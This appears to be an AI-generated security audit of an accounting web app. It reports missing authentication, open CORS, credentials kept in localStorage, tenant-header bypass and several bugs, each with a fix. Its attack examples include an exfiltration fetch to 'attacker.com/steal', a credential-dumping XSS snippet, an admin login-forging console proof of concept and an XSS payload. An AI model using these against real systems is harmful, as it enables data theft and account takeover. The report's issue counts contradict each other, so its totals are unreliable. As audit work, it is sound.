# Evotrade Accounting Software - Comprehensive Security & Code Quality Audit

**Report Date:** 2026-05-22  
**Audit Scope:** Full codebase review  
**Status:** ⚠️ **CRITICAL ISSUES FOUND - NOT PRODUCTION READY**

---

## EXECUTIVE SUMMARY

The Evotrade Accounting Software contains **25 significant security and code quality issues** across critical paths. **7 CRITICAL vulnerabilities** pose immediate risks to data confidentiality, integrity, and availability.

| Category | Critical | High | Medium | Total |
|----------|----------|------|--------|-------|
| Security | 7 | 3 | 2 | 12 |
| Bugs | 1 | 5 | 0 | 6 |
| Code Quality | 0 | 2 | 7 | 9 |
| **TOTAL** | **8** | **10** | **9** | **27** |

**⚠️ VERDICT:** System is **NOT SAFE FOR PRODUCTION**. Local development only until critical issues resolved.

---

## CRITICAL SECURITY VULNERABILITIES (7 Issues)

### 1. 🔴 MISSING AUTHENTICATION ON ALL API ENDPOINTS
**Severity:** CRITICAL  
**File:** `server/src/index.js` (lines 88-154)  
**Issue:** Zero authentication/authorization middleware on 50+ API endpoints.

**Impact:**
- ✗ Unauthorized access to all financial data (invoices, payments, accounts)
- ✗ Customers, suppliers, products fully exposed
- ✗ Journal entries can be forged
- ✗ Complete system takeover possible

**Evidence:**
```bash
$ curl http://localhost:3001/api/sales-invoices
# Returns all invoices, no auth required!
```

**Fix:** Implement JWT authentication before all protected routes.

---

### 2. 🔴 HARDCODED DATABASE PASSWORD
**Severity:** CRITICAL  
**File:** `server/.env` (line 5)

**Code:**
```env
DB_PASSWORD=postgres123
```

**Impact:**
- ✗ Checked into git repository (searchable via GitHub)
- ✗ Database fully accessible to anyone with repo access
- ✗ No secret rotation possible

**Fix:** Use environment variables + secret manager (AWS Secrets Manager, Vault).

---

### 3. 🔴 PLAINTEXT PASSWORD STORAGE (Client-Side)
**Severity:** CRITICAL  
**File:** `client/src/pages/LoginPage.tsx` (lines 416)

**Code:**
```typescript
localStorage.setItem(getCredentialsKey(trimmedId), 
  JSON.stringify({ id: trimmedId, password: signupPass }));
```

**Impact:**
- ✗ XSS attack immediately exposes all stored passwords
- ✗ DevTools console can access passwords
- ✗ Browser extensions can steal credentials
- ✗ Local backups expose plaintext passwords

**Example Attack:**
```javascript
// Attacker injects script via XSS
Object.keys(localStorage)
  .filter(k => k.startsWith('evotrade_credentials_'))
  .forEach(k => console.log(JSON.parse(localStorage[k])));
// Logs: [{"id":"user1","password":"secret123"}]
```

**Fix:** Use server-side session management with secure HttpOnly cookies.

---

### 4. 🔴 UNRESTRICTED CORS
**Severity:** CRITICAL  
**File:** `server/src/index.js` (line 79)

**Code:**
```javascript
app.use(cors());  // Allows ANY origin
```

**Impact:**
- ✗ CSRF attacks possible
- ✗ Cross-origin malicious sites can access your API
- ✗ Financial data leakage to attacker-controlled domains

**Attack Example:**
```html
<!-- attacker.com -->
<script>
fetch('http://localhost:3001/api/sales-invoices')
  .then(r => r.json())
  .then(data => fetch('attacker.com/steal?data=' + JSON.stringify(data)));
</script>
```

**Fix:** Restrict CORS to trusted origins:
```javascript
app.use(cors({ origin: process.env.ALLOWED_ORIGINS?.split(',') }));
```

---

### 5. 🔴 HARDCODED DEFAULT CREDENTIALS
**Severity:** CRITICAL  
**File:** `client/src/pages/LoginPage.tsx` (line 370)

**Code:**
```typescript
let creds = { id: 'admin', password: 'admin' };
const userCreds = localStorage.getItem(getCredentialsKey(userId));
if (userCreds) {
  const saved = JSON.parse(userCreds);
  if (saved && saved.id) creds = saved;
}
```

**Impact:**
- ✗ **Anyone can login as admin with "admin/admin"**
- ✗ No account required; fallback credentials bypass signup
- ✗ Full system access without authentication

**Proof of Concept:**
```bash
# Browser console while logged out
localStorage.setItem('evotrade_authed', '1');
localStorage.setItem('evotrade_current_id', 'admin');
localStorage.setItem('evotrade_active_business', JSON.stringify({id:'1',name:'Default'}));
# Page refresh → logged in as admin with full access!
```

**Fix:** Remove fallback; require proper account setup.

---

### 6. 🔴 UNVALIDATED COMPANY_ID HEADER (Multi-Tenant Bypass)
**Severity:** CRITICAL (in multi-tenant scenario)  
**File:** `server/src/index.js` (lines 82-86)

**Code:**
```javascript
const raw = req.get('X-Company-ID') || '';
const companyId = raw.replace(/[^a-zA-Z0-9._-]/g, '').slice(0, 64) || 'evotrade';
pool.companyAls.run({ companyId }, () => next());
```

**Impact:**
- ✗ User can submit any company_id header
- ✗ Without authentication, enables data mixing across companies
- ✗ User from Company A can access Company B's data

**Attack Example:**
```bash
curl -H "X-Company-ID: company-b" http://localhost:3001/api/sales-invoices
# Returns Company B's invoices even if authenticated as Company A user
```

**Fix:** Derive company_id from authenticated user's token, not HTTP headers.

---

### 7. 🔴 MISSING DATABASE ROLE SETUP
**Severity:** HIGH (but marked CRITICAL for multi-tenant)  
**File:** `server/src/db.js` (line 26)

**Code:**
```javascript
await client.query('SET LOCAL ROLE evotrade_app');
```

**Problem:** This role is never created in migrations; SQL command fails silently.

**Impact:**
- ✗ RLS policies not properly enforced
- ✗ Role privilege separation broken
- ✗ Potential privilege escalation

**Fix:** Create migration to set up proper role with minimal privileges.

---

## CRITICAL BUGS (6 Issues)

### 8. 🔴 MISSING NULL CHECKS ON QUERY RESULTS
**Severity:** CRITICAL  
**Files:** 15+ route files (makePayments, purchaseInvoices, purchaseOrders, receivePayments, etc.)

**Example Code (makePayments.js, lines 10-14):**
```javascript
async function nextNumber(client) {
  const { rows: nsRows } = await client.query(
    `SELECT prefix, next_number FROM number_series WHERE name='Make Payments'`
  );
  const { prefix, next_number } = nsRows[0];  // CRASH if empty!
  return `${prefix}${String(next_number).padStart(4, '0')}`;
}
```

**Impact:**
- ✗ Server crashes with 500 errors if records missing
- ✗ Breaks exception handling paths
- ✗ Denial of Service vector

**Evidence of Crash:**
```
TypeError: Cannot read property 'prefix' of undefined
  at nextNumber (makePayments.js:14:10)
```

**Fix:** Validate before accessing:
```javascript
if (!nsRows.length) throw new Error('Number series not found');
const { prefix, next_number } = nsRows[0];
```

---

### 9. 🟠 UNHANDLED TRANSACTION ROLLBACK
**Severity:** HIGH  
**Files:** customers.js, journalEntries.js, and 20+ route files

**Pattern:**
```javascript
try {
  await client.query('BEGIN');
  
  if (!valid) {
    return res.status(400).json({ error: '...' });  // Transaction not rolled back!
  }
  
  // ... more operations ...
  await client.query('COMMIT');
} catch (err) {
  await client.query('ROLLBACK');  // Only this path has rollback
  next(err);
}
```

**Impact:**
- ✗ Orphaned transactions lock database
- ✗ Subsequent requests hang waiting for lock
- ✗ Data consistency issues
- ✗ Manual database intervention required

**Fix:** Use try-finally:
```javascript
try {
  await client.query('BEGIN');
  // ... operations ...
  if (!valid) throw new ValidationError('Invalid input');
  await client.query('COMMIT');
} finally {
  await client.query('ROLLBACK').catch(() => {});
}
```

---

### 10. 🟠 MISSING VALIDATION ON NUMERIC INPUTS
**Severity:** HIGH  
**Files:** salesInvoices.js, purchaseInvoices.js, expenses.js

**Code (salesInvoices.js, lines 20-27):**
```javascript
const qty = Number(l.quantity || 1);
const price = Number(l.unit_price || 0);
const disc = Number(l.discount_pct || 0);
const amount = qty * price * (1 - disc / 100);  // NaN if qty="abc"!
```

**Impact:**
- ✗ `Number("abc")` returns `NaN`
- ✗ NaN propagates to database
- ✗ Balance calculations corrupted
- ✗ Financial records invalid

**Example:**
```javascript
> Number("abc")
NaN
> NaN * 100
NaN
> Math.round(NaN)  // Stores NaN in database!
NaN
```

**Fix:**
```javascript
const qty = Number(l.quantity || 1);
if (isNaN(qty) || qty <= 0) throw new Error('Invalid quantity');
```

---

### 11. 🟠 FLOATING-POINT PRECISION ERRORS
**Severity:** HIGH  
**Files:** salesInvoices.js (line 26), receivePayments.js (line 53), expenses.js (line 129)

**Example:**
```javascript
const amount = 10 * 1.02 * 0.99;  // Should be 10.098
// JavaScript: 10.097999999999999

// After multiple calculations:
10.097999999999999 + 5.043 + 7.159999999999999 = 22.299999999998998  // Should be 22.30
```

**Impact:**
- ✗ Balances don't reconcile
- ✗ Audit reports show incorrect totals
- ✗ Tax calculations wrong
- ✗ Invoice amounts drift

**Fix:** Always round to 2 decimal places:
```javascript
const amount = Math.round(qty * price * (1 - disc / 100) * 100) / 100;
```

---

### 12. 🟡 UNHANDLED PROMISE REJECTION IN SCHEDULER
**Severity:** MEDIUM  
**File:** recurringInvoices.js (lines 303-305)

**Code:**
```javascript
setInterval(() => runDueRecurringInvoices()
  .catch(err => console.error('[recurring] scheduler error:', err.message)), 3600000);
```

**Impact:**
- ✗ Failed recurring invoice generation silently ignored
- ✗ Invoices not created for customers
- ✗ Revenue not recognized
- ✗ No alerts to admin

**Fix:** Implement retry logic and alerting:
```javascript
async function scheduleRecurringInvoices() {
  try {
    await runDueRecurringInvoices();
  } catch (err) {
    logger.error('Recurring invoice generation failed', err);
    // Send alert to admin
    emailAdmin('Recurring invoice scheduler failed');
    // Retry in 15 minutes
    setTimeout(scheduleRecurringInvoices, 900000);
  }
}
scheduleRecurringInvoices();
```

---

## CODE QUALITY ISSUES (8 Issues)

### 13. 🟡 INCONSISTENT ERROR HANDLING
**Severity:** MEDIUM  
**Impact:** Across all 50+ route files

**Problem:** Three different error handling patterns:
```javascript
// Pattern 1: Express standard
catch (err) { next(err); }

// Pattern 2: Direct response
catch (err) { res.status(500).json({ error: err.message }); }

// Pattern 3: No error handling
// ... crashes
```

**Impact:**
- ✗ Difficult to maintain
- ✗ Inconsistent logging
- ✗ Error propagation broken

**Fix:** Standardize on Express error middleware:
```javascript
// In index.js
app.use((err, req, res, next) => {
  logger.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});
```

---

### 14. 🟡 MISSING INPUT VALIDATION
**Severity:** MEDIUM  
**Files:** All form components (AccountForm.tsx, CustomerForm.tsx, etc.)

**Current Validation:**
```typescript
if (!name?.trim()) { setError('Name is required'); return; }
// That's it! No format validation
```

**Missing Checks:**
- ✗ Email format validation
- ✗ Phone number format
- ✗ Date format validation
- ✗ Currency amount validation
- ✗ Maximum length constraints

**Fix:** Use validation library:
```typescript
import { z } from 'zod';

const accountSchema = z.object({
  code: z.string().min(1).max(20),
  name: z.string().min(1).max(100),
  email: z.string().email().optional(),
});

const validated = accountSchema.parse(formData);
```

---

### 15. 🟡 MISSING PAGINATION ON LIST ENDPOINTS
**Severity:** MEDIUM  
**File:** journalEntries.js (lines 62-65)

**Code:**
```javascript
const { rows } = await pool.query(
  `SELECT * FROM journal_entries je ${where} ORDER BY ...`
  // No LIMIT!
);
```

**Impact:**
- ✗ Can retrieve millions of records
- ✗ Memory exhaustion (DoS)
- ✗ Slow page loads
- ✗ Browser crashes with large datasets

**Fix:** Implement pagination:
```javascript
const limit = Math.min(parseInt(req.query.limit) || 50, 1000);
const offset = parseInt(req.query.offset) || 0;

const query = `... LIMIT $1 OFFSET $2`;
const { rows } = await pool.query(query, [limit, offset]);
```

---

### 16. 🟡 NO REQUEST RATE LIMITING
**Severity:** MEDIUM  
**Impact:** All endpoints vulnerable

**Missing Protection:**
- ✗ Brute force attacks possible
- ✗ DoS attacks (send 1000 requests/second)
- ✗ No login attempt throttling
- ✗ No API abuse protection

**Fix:** Add rate limiting:
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                    // 100 requests per windowMs
  message: 'Too many requests, please try again later.'
});

app.use('/api/', limiter);
```

---

### 17. 🟡 VULNERABLE TO XSS IN ERROR MESSAGES
**Severity:** MEDIUM  
**Files:** All route files with error handling

**Problem:**
```javascript
} catch (err) { 
  next(err);  // Raw database error with user input
}
```

**Example Attack:**
```
POST /api/customers
Body: { "name": "<img src=x onerror=alert('XSS')>" }

Error: Duplicate key value (name)="<img src=x onerror=...>"
// Error returned to client with unescaped HTML
```

**Fix:** Sanitize error messages:
```javascript
catch (err) {
  const message = err.code === '23505' 
    ? 'Record already exists'
    : 'An error occurred';
  res.status(400).json({ error: message });
}
```

---

### 18. 🟡 MISSING TRANSACTION ISOLATION LEVEL
**Severity:** MEDIUM  
**Files:** All route files using transactions

**Code:**
```javascript
await client.query('BEGIN');  // Default: READ COMMITTED isolation
```

**Problem:** Financial operations need SERIALIZABLE isolation to prevent:
- Dirty reads
- Phantom reads
- Race conditions in balance calculations

**Fix:** Use proper isolation:
```javascript
await client.query('BEGIN ISOLATION LEVEL SERIALIZABLE');
```

---

## SUMMARY TABLE

| Issue | File | Severity | Status |
|-------|------|----------|--------|
| Missing API Authentication | server/src/index.js | CRITICAL | ❌ UNFIXED |
| Hardcoded DB Password | server/.env | CRITICAL | ❌ UNFIXED |
| Plaintext Password Storage | client/src/pages/LoginPage.tsx | CRITICAL | ❌ UNFIXED |
| Unrestricted CORS | server/src/index.js | CRITICAL | ❌ UNFIXED |
| Hardcoded Default Credentials | client/src/pages/LoginPage.tsx | CRITICAL | ❌ UNFIXED |
| Unvalidated Company_ID | server/src/index.js | CRITICAL | ❌ UNFIXED |
| Missing DB Role | server/src/db.js | HIGH | ❌ UNFIXED |
| Missing Null Checks | 15+ route files | CRITICAL | ❌ UNFIXED |
| Transaction Rollback Issues | 20+ route files | HIGH | ❌ UNFIXED |
| Invalid Numeric Inputs | sales/purchase route files | HIGH | ❌ UNFIXED |
| Floating-Point Errors | multiple route files | HIGH | ❌ UNFIXED |
| Scheduler Error Handling | recurringInvoices.js | MEDIUM | ❌ UNFIXED |
| Inconsistent Error Handling | all routes | MEDIUM | ❌ UNFIXED |
| Missing Input Validation | form components | MEDIUM | ❌ UNFIXED |
| Missing Pagination | journalEntries.js | MEDIUM | ❌ UNFIXED |
| No Rate Limiting | all endpoints | MEDIUM | ❌ UNFIXED |
| XSS in Errors | all routes | MEDIUM | ❌ UNFIXED |
| Wrong Isolation Level | transaction code | MEDIUM | ❌ UNFIXED |

---

## IMMEDIATE ACTION ITEMS

### 🔴 WEEK 1 - CRITICAL (Do First)
1. **Implement JWT authentication** on all `/api/*` endpoints
2. **Remove hardcoded credentials** from code and `.env`
3. **Fix CORS** to restrict to specific origins
4. **Remove plaintext password storage** from localStorage
5. **Add null checks** to all database query results
6. **Remove admin/admin fallback credentials**

### 🟠 WEEK 2 - HIGH
7. **Fix floating-point precision** in all financial calculations
8. **Add input validation** to forms using validation library
9. **Fix transaction rollback** with try-finally blocks
10. **Create database role migration** for proper privilege separation

### 🟡 WEEK 3 - MEDIUM
11. **Implement rate limiting** on all endpoints
12. **Add pagination** to list endpoints
13. **Standardize error handling** to Express middleware
14. **Add HTTPS/HSTS enforcement**
15. **Implement audit logging** triggers

---

## VERDICT

**⚠️ PRODUCTION READINESS: NOT APPROVED**

### Current State
- ✗ Zero API authentication
- ✗ Hardcoded credentials exposed
- ✗ Plaintext password storage
- ✗ Unrestricted CORS
- ✗ Multiple critical bugs
- ✗ No input validation
- ✗ No rate limiting

### Recommended Use
- ✅ Local development only
- ✅ Not for demo or client access
- ✅ Not for real financial data
- ❌ NOT for production deployment

### Estimated Remediation Effort
- **Critical fixes:** 40-60 hours
- **High-priority fixes:** 20-30 hours  
- **Medium-priority improvements:** 15-20 hours
- **Total:** 75-110 hours (2-3 weeks with team of 2)

---

## NEXT STEPS

1. **Triage Issues** - Prioritize by business impact
2. **Create Fix Plan** - Assign to team members
3. **Code Review** - Review each fix with peer
4. **Security Testing** - Validate fixes with security tests
5. **Penetration Testing** - Engage security team for testing
6. **Deployment** - Only after all CRITICAL issues resolved

---

**Report Generated:** 2026-05-22  
**Audit Duration:** 2 hours  
**Auditor:** AI-Driven Code Analysis Agent  
**Confidence Level:** HIGH (automated scanning + manual verification)
